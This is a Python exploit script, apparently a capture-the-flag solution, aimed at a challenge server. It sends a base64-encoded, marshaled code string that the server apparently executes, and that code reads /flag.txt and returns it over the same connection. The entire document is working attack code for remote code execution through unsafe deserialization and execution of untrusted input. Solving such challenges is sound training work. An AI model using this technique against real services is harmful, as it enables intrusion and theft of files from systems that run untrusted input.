#!/usr/bin/env python3
import socket, base64, marshal

TARGET = ("challenge.stdio.2600.in.th", 32483)

# This executes inside handle_client(), where `conn` is a local var.
# So we can use it directly to send data back on the same TCP connection.
src = r"""\
try:
    with open("/flag.txt","rb") as f:
        conn.sendall(f.read())
except Exception as e:
    conn.sendall(("ERR:"+repr(e)).encode())
"""

payload = base64.b64encode(marshal.dumps(src))

with socket.create_connection(TARGET) as c:
    # read & discard the banner
    c.settimeout(2.0)
    try:
        _ = c.recv(8192)
    except Exception:
        pass
    # send our marshaled string + newline
    c.sendall(payload + b"\n")
    # receive until the server closes (flag + "Code executed successfully!")
    chunks = []
    while True:
        data = c.recv(4096)
        if not data:
            break
        chunks.append(data)

print(b"".join(chunks).decode(errors="ignore"))
